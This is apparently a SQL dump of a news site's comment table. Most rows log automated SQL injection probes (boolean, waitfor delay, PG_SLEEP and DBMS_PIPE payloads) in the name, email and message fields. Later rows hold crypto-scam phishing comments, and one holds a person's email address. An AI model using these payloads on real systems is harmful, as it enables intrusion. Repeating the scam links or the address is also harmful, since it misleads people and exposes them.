INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88152, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:16', '1403/5/11', '11:40:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88153, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:23', '1403/5/11', '11:40:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88154, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:23', '1403/5/11', '11:40:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88155, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:27', '1403/5/11', '11:40:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88156, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:48', '1403/5/11', '11:40:48 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88157, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:02', '1403/5/11', '11:41:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88158, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:17', '1403/5/11', '11:41:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88159, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:19', '1403/5/11', '11:41:19 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88160, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:23', '1403/5/11', '11:41:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88161, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:27', '1403/5/11', '11:41:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88162, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:30', '1403/5/11', '11:41:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88163, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:41', '1403/5/11', '11:41:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88164, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:41:47', '1403/5/11', '11:41:47 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88165, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:42:10', '1403/5/11', '11:42:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88166, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:42:18', '1403/5/11', '11:42:18 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88167, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:42:23', '1403/5/11', '11:42:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88168, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:42:28', '1403/5/11', '11:42:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88169, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:42:53', '1403/5/11', '11:42:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88170, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:43:08', '1403/5/11', '11:43:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88171, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:43:15', '1403/5/11', '11:43:15 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88172, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:43:24', '1403/5/11', '11:43:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88173, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:43:37', '1403/5/11', '11:43:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88174, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:43:52', '1403/5/11', '11:43:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88175, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:43:54', '1403/5/11', '11:43:54 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88176, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:43:59', '1403/5/11', '11:43:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88177, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:44:02', '1403/5/11', '11:44:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88178, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:44:08', '1403/5/11', '11:44:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88179, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:44:17', '1403/5/11', '11:44:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88180, 60238, 'pHqghUme', 'sample@email.tst', '-1 OR 2+819-819-1=0+0+0+1 -- ', 0, '2024-08-01 11:44:20', '1403/5/11', '11:44:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88181, 60238, 'pHqghUme', 'sample@email.tst', '-1 OR 3+819-819-1=0+0+0+1 -- ', 0, '2024-08-01 11:44:21', '1403/5/11', '11:44:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88182, 60238, 'pHqghUme', 'sample@email.tst', '-1 OR 2+328-328-1=0+0+0+1', 0, '2024-08-01 11:44:24', '1403/5/11', '11:44:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88183, 60238, 'pHqghUme', 'sample@email.tst', '-1 OR 3+328-328-1=0+0+0+1', 0, '2024-08-01 11:44:32', '1403/5/11', '11:44:32 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88184, 60238, 'pHqghUme', 'sample@email.tst', '-1\'\' OR 2+318-318-1=0+0+0+1 -- ', 0, '2024-08-01 11:44:34', '1403/5/11', '11:44:34 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88185, 60238, 'pHqghUme', 'sample@email.tst', '-1\'\' OR 3+318-318-1=0+0+0+1 -- ', 0, '2024-08-01 11:44:36', '1403/5/11', '11:44:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88186, 60238, 'pHqghUme', 'sample@email.tst', '-1\'\' OR 2+572-572-1=0+0+0+1 or \'\'lv1viyON\'\'=', 0, '2024-08-01 11:44:40', '1403/5/11', '11:44:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88187, 60238, 'pHqghUme', 'sample@email.tst', '-1\'\' OR 3+572-572-1=0+0+0+1 or \'\'lv1viyON\'\'=', 0, '2024-08-01 11:44:43', '1403/5/11', '11:44:43 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88188, 60238, 'pHqghUme', 'sample@email.tst', '-1" OR 2+206-206-1=0+0+0+1 -- ', 0, '2024-08-01 11:44:44', '1403/5/11', '11:44:44 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88189, 60238, 'pHqghUme', 'sample@email.tst', '-1" OR 3+206-206-1=0+0+0+1 -- ', 0, '2024-08-01 11:44:52', '1403/5/11', '11:44:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88194, 60238, 'pHqghUme', 'sample@email.tst', '-1; waitfor delay \'\'0:0:15\'\' -- ', 0, '2024-08-01 11:45:35', '1403/5/11', '11:45:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88197, 60238, 'pHqghUme', 'sample@email.tst', '1 waitfor delay \'\'0:0:15\'\' -- ', 0, '2024-08-01 11:45:42', '1403/5/11', '11:45:42 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88198, 60238, 'pHqghUme', 'sample@email.tst', '2h6uW9D1\'\'; waitfor delay \'\'0:0:15\'\' -- ', 0, '2024-08-01 11:45:45', '1403/5/11', '11:45:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88210, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:47:16', '1403/5/11', '11:47:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88211, 60238, 'pHqghUme', 'sample@email.tst', '1 ����%2527%2522', 0, '2024-08-01 11:47:21', '1403/5/11', '11:47:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88212, 60238, 'pHqghUme', 'sample@email.tst', '@@CVAnr', 0, '2024-08-01 11:47:24', '1403/5/11', '11:47:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88213, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:47:34', '1403/5/11', '11:47:34 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88214, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:47:42', '1403/5/11', '11:47:42 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88215, 60238, 'pHqghUme', '-1 OR 2+858-858-1=0+0+0+1 --', '1', 0, '2024-08-01 11:47:49', '1403/5/11', '11:47:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88216, 60238, 'pHqghUme', '-1 OR 3+858-858-1=0+0+0+1 --', '1', 0, '2024-08-01 11:48:00', '1403/5/11', '11:48:00 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88217, 60238, 'pHqghUme', '-1 OR 2+21-21-1=0+0+0+1', '1', 0, '2024-08-01 11:48:02', '1403/5/11', '11:48:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88218, 60238, 'pHqghUme', '-1 OR 3+21-21-1=0+0+0+1', '1', 0, '2024-08-01 11:48:07', '1403/5/11', '11:48:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88219, 60238, 'pHqghUme', '-1\'\' OR 2+68-68-1=0+0+0+1 --', '1', 0, '2024-08-01 11:48:17', '1403/5/11', '11:48:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88220, 60238, 'pHqghUme', '-1\'\' OR 3+68-68-1=0+0+0+1 --', '1', 0, '2024-08-01 11:48:27', '1403/5/11', '11:48:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88221, 60238, 'pHqghUme', '-1\'\' OR 2+136-136-1=0+0+0+1 or \'\'oyqkdwOl\'\'=', '1', 0, '2024-08-01 11:48:40', '1403/5/11', '11:48:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88222, 60238, 'pHqghUme', '-1\'\' OR 3+136-136-1=0+0+0+1 or \'\'oyqkdwOl\'\'=', '1', 0, '2024-08-01 11:48:45', '1403/5/11', '11:48:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88223, 60238, 'pHqghUme', '-1" OR 2+101-101-1=0+0+0+1 --', '1', 0, '2024-08-01 11:48:49', '1403/5/11', '11:48:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88224, 60238, 'pHqghUme', '-1" OR 3+101-101-1=0+0+0+1 --', '1', 0, '2024-08-01 11:48:53', '1403/5/11', '11:48:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88225, 60238, 'pHqghUme', 'if(now(', '1', 0, '2024-08-01 11:49:14', '1403/5/11', '11:49:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88226, 60238, 'pHqghUme', '0\'\'XOR(if(now(', '1', 0, '2024-08-01 11:49:28', '1403/5/11', '11:49:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88227, 60238, 'pHqghUme', '0"XOR(if(now(', '1', 0, '2024-08-01 11:49:39', '1403/5/11', '11:49:39 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88228, 60238, 'pHqghUme', '(select(0', '1', 0, '2024-08-01 11:49:59', '1403/5/11', '11:49:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88229, 60238, 'pHqghUme', '1 waitfor delay \'\'0:0:15\'\' --', '1', 0, '2024-08-01 11:50:35', '1403/5/11', '11:50:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88230, 60238, 'pHqghUme', '439zPq1o\'\'; waitfor delay \'\'0:0:15\'\' --', '1', 0, '2024-08-01 11:50:59', '1403/5/11', '11:50:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88231, 60238, 'pHqghUme', '429OFUau', '1', 0, '2024-08-01 11:51:19', '1403/5/11', '11:51:19 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88232, 60238, 'pHqghUme', 'VtIPm5MQ', '1', 0, '2024-08-01 11:51:29', '1403/5/11', '11:51:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88233, 60238, 'pHqghUme', 'Jbl8ALOC\'\' OR 55=(SELECT 55 FROM PG_SLEEP(15', '1', 0, '2024-08-01 11:51:41', '1403/5/11', '11:51:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88234, 60238, 'pHqghUme', 'LPbJd46A', '1', 0, '2024-08-01 11:52:11', '1403/5/11', '11:52:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88235, 60238, 'pHqghUme', 'ff9iTr9H', '1', 0, '2024-08-01 11:52:47', '1403/5/11', '11:52:47 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88236, 60238, 'pHqghUme', 'sample@email.tst\'\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(9', '1', 0, '2024-08-01 11:53:10', '1403/5/11', '11:53:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88237, 60238, 'pHqghUme', '1', '1', 0, '2024-08-01 11:53:17', '1403/5/11', '11:53:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88238, 60238, 'pHqghUme', '1 ����%2527%2522', '1', 0, '2024-08-01 11:53:23', '1403/5/11', '11:53:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88239, 60238, 'pHqghUme', '@@6k45A', '1', 0, '2024-08-01 11:53:36', '1403/5/11', '11:53:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88240, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:53:51', '1403/5/11', '11:53:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88241, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:54:46', '1403/5/11', '11:54:46 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88242, 60238, '-1 OR 2+536-536-1=0+0+0+1 --', 'sample@email.tst', '1', 0, '2024-08-01 11:54:48', '1403/5/11', '11:54:48 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88243, 60238, '-1 OR 3+536-536-1=0+0+0+1 --', 'sample@email.tst', '1', 0, '2024-08-01 11:54:56', '1403/5/11', '11:54:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88244, 60238, '-1 OR 2+221-221-1=0+0+0+1', 'sample@email.tst', '1', 0, '2024-08-01 11:55:01', '1403/5/11', '11:55:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88245, 60238, '-1 OR 3+221-221-1=0+0+0+1', 'sample@email.tst', '1', 0, '2024-08-01 11:55:03', '1403/5/11', '11:55:03 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88246, 60238, '-1\'\' OR 2+900-900-1=0+0+0+1 --', 'sample@email.tst', '1', 0, '2024-08-01 11:55:09', '1403/5/11', '11:55:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88247, 60238, '-1\'\' OR 3+900-900-1=0+0+0+1 --', 'sample@email.tst', '1', 0, '2024-08-01 11:55:15', '1403/5/11', '11:55:15 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88248, 60238, '-1\'\' OR 2+976-976-1=0+0+0+1 or \'\'Y2oDSZPt\'\'=', 'sample@email.tst', '1', 0, '2024-08-01 11:55:22', '1403/5/11', '11:55:22 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88249, 60238, '-1\'\' OR 3+976-976-1=0+0+0+1 or \'\'Y2oDSZPt\'\'=', 'sample@email.tst', '1', 0, '2024-08-01 11:55:27', '1403/5/11', '11:55:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88250, 60238, '-1" OR 2+465-465-1=0+0+0+1 --', 'sample@email.tst', '1', 0, '2024-08-01 11:55:31', '1403/5/11', '11:55:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88251, 60238, '-1" OR 3+465-465-1=0+0+0+1 --', 'sample@email.tst', '1', 0, '2024-08-01 11:55:35', '1403/5/11', '11:55:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88256, 60238, '1 waitfor delay \'\'0:0:15\'\' --', 'sample@email.tst', '1', 0, '2024-08-01 11:57:26', '1403/5/11', '11:57:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88257, 60238, 'BeF66qs5\'\'; waitfor delay \'\'0:0:15\'\' --', 'sample@email.tst', '1', 0, '2024-08-01 11:57:48', '1403/5/11', '11:57:48 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88264, 60238, '1', 'sample@email.tst', '1', 0, '2024-08-01 12:00:10', '1403/5/11', '12:00:10 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88265, 60238, '1 ����%2527%2522', 'sample@email.tst', '1', 0, '2024-08-01 12:00:21', '1403/5/11', '12:00:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88266, 60238, '@@lLwCX', 'sample@email.tst', '1', 0, '2024-08-01 12:00:38', '1403/5/11', '12:00:38 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88267, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:00:56', '1403/5/11', '12:00:56 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88268, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:01:22', '1403/5/11', '12:01:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88269, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:01:43', '1403/5/11', '12:01:43 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88270, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:01:53', '1403/5/11', '12:01:53 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88271, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:01:58', '1403/5/11', '12:01:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88272, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:02:02', '1403/5/11', '12:02:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88273, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:02:17', '1403/5/11', '12:02:17 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88274, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:02:34', '1403/5/11', '12:02:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88275, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:02:54', '1403/5/11', '12:02:54 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88276, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:03:34', '1403/5/11', '12:03:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88277, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:03:44', '1403/5/11', '12:03:44 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88278, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:04:08', '1403/5/11', '12:04:08 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88279, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:04:29', '1403/5/11', '12:04:29 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88280, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:05:14', '1403/5/11', '12:05:14 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88281, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:05:58', '1403/5/11', '12:05:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88282, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:06:52', '1403/5/11', '12:06:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88283, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:07:24', '1403/5/11', '12:07:24 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88284, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:07:34', '1403/5/11', '12:07:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88285, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:07:54', '1403/5/11', '12:07:54 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88286, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:07:59', '1403/5/11', '12:07:59 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88287, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:08:07', '1403/5/11', '12:08:07 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88288, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:08:25', '1403/5/11', '12:08:25 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88289, 60236, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 12:16:33', '1403/5/11', '12:16:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88290, 60235, '🗂 You got a gift from unknown user. Receive => https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbn', 'hatty2001@murahpanel.com', 'ghzjy1', 0, '2024-08-03 05:06:01', '1403/5/13', '5:06:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88291, 60236, '✒ Reminder: Process 1,00987 BTC. Assure > https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNh', 'hatty2001@murahpanel.com', 'wf1okb', 0, '2024-08-03 05:06:10', '1403/5/13', '5:06:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88292, 60237, '✂ You have a gift from our company. Next >> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcn', 'hatty2001@murahpanel.com', 'w8pckz', 0, '2024-08-03 05:06:21', '1403/5/13', '5:06:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88293, 60238, '📞 Email- TRANSFER 1,00412 BTC. Withdraw >> out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdGlvbj', 'hatty2001@murahpanel.com', '2b3gxm', 0, '2024-08-03 05:06:33', '1403/5/13', '5:06:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88294, 51185, 'بابک رحمانی', 'gol.1400.gol@gmail.com', 'درود
